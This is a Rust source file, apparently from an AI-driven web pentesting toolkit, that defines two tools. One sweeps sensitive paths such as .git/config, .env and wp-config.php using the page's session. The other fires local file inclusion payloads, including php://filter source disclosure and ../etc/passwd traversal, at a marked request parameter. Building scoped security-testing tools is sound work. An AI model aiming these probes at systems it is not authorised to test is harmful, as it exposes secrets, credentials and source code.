//! Port of `src/main/mcp/tools/path_probe.ts` — two tools:
//! - `path_probe`: fan common backup/disclosure paths against the active origin
//!   via in-page `fetch` (through the engine, so it carries the page session),
//!   flagging any path whose response differs from the "absent" baseline.
//! - `lfi_probe`: fire LFI payloads at a `§`-marked request through `send()`.

use std::sync::PoisonError;
use std::time::{Duration, Instant};

use rever_scope::scope::scope_block_for_url;
use rever_tools_api::tool::{BoxFuture, Tool, ToolContext, ToolDef};
use rever_tools_api::utils::{ToolResult, err, ok};
use rever_tools_http::{build_request_spec, restore_marker, send};
use serde_json::{Value, json};

use crate::args::{strings, text, validate};
use crate::common::{apply_payload, random_nonce};
use crate::{pretty, schema};

const SEND_TIMEOUT: Duration = Duration::from_secs(15);
/// The whole path sweep is bounded, as the TypeScript's `Date.now() + 120_000`.
const SWEEP_BUDGET: Duration = Duration::from_secs(120);

const DEFAULT_WORDLIST: &[&str] = &[
    // VCS / backups
    ".git/HEAD",
    ".git/config",
    ".svn/entries",
    ".hg/store",
    ".bzr/branch/last-revision",
    // Editor swap files
    ".index.php.swp",
    ".index.html.swp",
    ".bak",
    ".old",
    "~",
    // Environment / config
    ".env",
    ".env.local",
    ".env.production",
    "config.php",
    "config.json",
    "composer.json",
    "composer.lock",
    "package.json",
    "package-lock.json",
    "yarn.lock",
    "pnpm-lock.yaml",
    "docker-compose.yml",
    "Dockerfile",
    "wp-config.php",
    // Server status / debug
    "server-status",
    "server-info",
    "phpinfo.php",
    "info.php",
    "test.php",
    "debug.php",
    // Ops / dev / health
    "healthcheck",
    "healthcheck-dev",
    "health",
    "healthz",
    "livez",
    "readyz",
    "status",
    "metrics",
    "actuator",
    "actuator/health",
    "debug",
    "api",
    "api/health",
    "internal",
    "dev",
    // Common admin paths
    "admin/",
    "administrator/",
    "wp-admin/",
    "phpmyadmin/",
    // Sourcemap leaks
    "main.js.map",
    "app.js.map",
    "bundle.js.map",
    // Robots / sitemap
    "robots.txt",
    "sitemap.xml",
    "security.txt",
    ".well-known/security.txt",
];

const LFI_TEMPLATES: &[&str] = &[
    // php://filter source disclosure variants
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=string.rot13/resource=index.php",
    // Path traversal
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
];

/// A probed path is interesting when its response differs from the app's
/// "absent" baseline (a random nonexistent path) — surfacing an authed 400 or a
/// proxy 403 on an unlinked endpoint, not just 2xx. Falls back to the plain
/// 2xx/3xx heuristic when the baseline probe itself failed.
pub fn is_interesting_status(status: u64, baseline_status: u64) -> bool {
    if status == 0 {
        return false;
    }
    if baseline_status > 0 {
        return status != baseline_status;
    }
    (200..400).contains(&status) && status != 301 && status != 302
}

pub struct PathProbe;

impl Tool for PathProbe {
    fn def(&self) -> ToolDef {
        ToolDef::new(
            "path_probe",
            "Probe common backup/disclosure paths (.git/HEAD, .env, *.swp, server-status, sourcemaps, wp-config). Reports any path returning 200 / non-default response. Provide baseUrl OR use the active page origin.",
            schema(
                json!({
                    "baseUrl": { "type": "string", "description": "e.g. https://target.com/. Defaults to active origin." },
                    "wordlist": { "type": "array", "items": { "type": "string" }, "description": "Override the default path list (max 2000)" },
                    "concurrency": { "type": "integer", "description": "Default 6" },
                    "useDefault": { "type": "boolean", "description": "Merge user wordlist with builtin (default true)" }
                }),
                &[],
            ),
        )
    }

    fn call<'a>(&'a self, ctx: &'a ToolContext, args: Value) -> BoxFuture<'a, ToolResult> {
        Box::pin(async move {
            if let Err(refusal) = validate(&self.def(), &args) {
                return refusal;
            }
            let use_default = args["useDefault"].as_bool().unwrap_or(true);

            // Origin: the given baseUrl, or `location.origin` from the active page.
            let origin = match text(&args, "baseUrl") {
                Some(url) => url.to_owned(),
                None => match ctx.browser.evaluate("location.origin").await {
                    Ok(Value::String(origin)) => origin,
                    Ok(_) => return err("could not resolve base URL"),
                    Err(_) => return err("no active page; supply baseUrl"),
                },
            };
            if origin.is_empty() {
                return err("could not resolve base URL");
            }
            let base = if origin.ends_with('/') {
                origin
            } else {
                format!("{origin}/")
            };

            let mut paths: Vec<String> = strings(&args, "wordlist").unwrap_or_default();
            if use_default {
                paths.extend(DEFAULT_WORDLIST.iter().map(|p| (*p).to_owned()));
            }
            let queue: Vec<String> = paths
                .iter()
                .map(|p| {
                    if p.starts_with("http") {
                        p.clone()
                    } else {
                        format!("{base}{}", p.trim_start_matches('/'))
                    }
                })
                .collect();
            // In-page fetch bypasses send(), so check scope up front.
            for u in &queue {
                if let Some(block) = scope_block_for_url(Some(u)) {
                    return err(block);
                }
            }

            // Learn the "absent" response so a real hidden path is one whose
            // status differs from it.
            let baseline_url = format!("{base}__rever_absent_{}", random_nonce());
            let baseline_status = fetch_status(ctx, &baseline_url).await;

            // shortcut: probes sequentially (the `concurrency` arg is accepted
            // for API parity); switch to buffered futures if the list grows.
            let deadline = Instant::now() + SWEEP_BUDGET;
            let mut results = Vec::with_capacity(queue.len());
            for u in &queue {
                if Instant::now() > deadline {
                    break;
                }
                let (status, length, content_type) = fetch_probe(ctx, u).await;
                let interesting = is_interesting_status(status, baseline_status);
                results.push(json!({
                    "url": u,
                    "status": status,
                    "length": length,
                    "contentType": content_type,
                    "interesting": interesting,
                }));
            }
            // Interesting first (stable), as the TS sort does.
            results.sort_by(|a, b| {
                b["interesting"]
                    .as_bool()
                    .cmp(&a["interesting"].as_bool())
            });

            let interesting = results
                .iter()
                .filter(|r| r["interesting"].as_bool() == Some(true))
                .count();
            ok(pretty(&json!({
                "baseUrl": base,
                "probed": results.len(),
                "interesting": interesting,
                "results": results,
            })))
        })
    }
}

/// `fetch(u, {credentials:'include', redirect:'manual'})` in the page, returning
/// the status only (0 on error) — used for the baseline.
async fn fetch_status(ctx: &ToolContext, url: &str) -> u64 {
    let expr = format!(
        "(async()=>{{try{{const r=await fetch({},{{credentials:'include',redirect:'manual'}});await r.arrayBuffer();return r.status}}catch(e){{return 0}}}})()",
        json_str(url)
    );
    match ctx.browser.evaluate(&expr).await {
        Ok(value) => value.as_u64().unwrap_or(0),
        Err(_) => 0,
    }
}

/// `fetch` in the page returning `{status, length, ct}`.
async fn fetch_probe(ctx: &ToolContext, url: &str) -> (u64, u64, String) {
    let expr = format!(
        "(async()=>{{try{{const r=await fetch({},{{credentials:'include',redirect:'manual'}});const buf=await r.arrayBuffer();return {{status:r.status,length:buf.byteLength,ct:r.headers.get('content-type')||''}}}}catch(e){{return {{status:0,length:0,ct:''}}}}}})()",
        json_str(url)
    );
    match ctx.browser.evaluate(&expr).await {
        Ok(value) => (
            value["status"].as_u64().unwrap_or(0),
            value["length"].as_u64().unwrap_or(0),
            value["ct"].as_str().unwrap_or_default().to_owned(),
        ),
        Err(_) => (0, 0, String::new()),
    }
}

/// `JSON.stringify(s)` for embedding a string literal in an evaluated expression.
fn json_str(s: &str) -> String {
    serde_json::to_string(s).unwrap_or_else(|_| "\"\"".to_owned())
}

pub struct LfiProbe;

impl Tool for LfiProbe {
    fn def(&self) -> ToolDef {
        ToolDef::new(
            "lfi_probe",
            "Try common LFI payloads (php://filter source disclosure, ../etc/passwd traversal) against a vulnerable URL parameter. The marker `§` is replaced with each payload.",
            schema(
                json!({
                    "requestId": { "type": "string", "description": "Base requestId (must contain § marker in URL/body)" },
                    "payloads": { "type": "array", "items": { "type": "string" }, "description": "Override default LFI payloads (max 500)" }
                }),
                &["requestId"],
            ),
        )
    }

    fn call<'a>(&'a self, ctx: &'a ToolContext, args: Value) -> BoxFuture<'a, ToolResult> {
        Box::pin(async move {
            if let Err(refusal) = validate(&self.def(), &args) {
                return refusal;
            }
            let request_id = text(&args, "requestId").unwrap_or_default().to_owned();
            let base = {
                let store = ctx.traffic.lock().unwrap_or_else(PoisonError::into_inner);
                match build_request_spec(&store, Some(&request_id), None) {
                    Ok(spec) => restore_marker(spec),
                    Err(error) => return err(error),
                }
            };
            // lfi only injects the url or body; headers are not checked.
            if !base.url.contains('§') && !base.body.as_deref().unwrap_or_default().contains('§') {
                return err("marker § not found in request URL or body");
            }

            let list = strings(&args, "payloads")
                .filter(|list| !list.is_empty())
                .unwrap_or_else(|| LFI_TEMPLATES.iter().map(|p| (*p).to_owned()).collect());
            let list: Vec<String> = list.into_iter().take(500).collect();

            let mut results = Vec::with_capacity(list.len());
            for payload in &list {
                // form_body=false: url url-encoded, body raw — the TS lfi `sub`.
                let out = send(&apply_payload(&base, payload, false), SEND_TIMEOUT).await;
                results.push(json!({
                    "payload": payload,
                    "status": out.status,
                    "length": out.body.len(),
                    "preview": out.body.chars().take(200).collect::<String>(),
                }));
            }
            ok(pretty(&json!(results)))
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn 베이스라인과_다른_상태는_흥미롭다() {
        // With a baseline, anything different is interesting (authed 400, proxy 403).
        assert!(is_interesting_status(403, 404));
        assert!(is_interesting_status(400, 404));
        assert!(!is_interesting_status(404, 404));
        assert!(!is_interesting_status(0, 404));
    }

    #[test]
    fn 베이스라인이_없으면_2xx_3xx만_흥미롭다() {
        assert!(is_interesting_status(200, 0));
        assert!(is_interesting_status(304, 0));
        assert!(!is_interesting_status(301, 0));
        assert!(!is_interesting_status(302, 0));
        assert!(!is_interesting_status(404, 0));
        assert!(!is_interesting_status(500, 0));
    }

    #[test]
    fn 기본_워드리스트와_lfi_템플릿() {
        assert!(DEFAULT_WORDLIST.contains(&".git/HEAD"));
        assert!(DEFAULT_WORDLIST.contains(&".env"));
        assert_eq!(LFI_TEMPLATES.len(), 6);
        assert!(LFI_TEMPLATES[0].starts_with("php://filter"));
    }
}
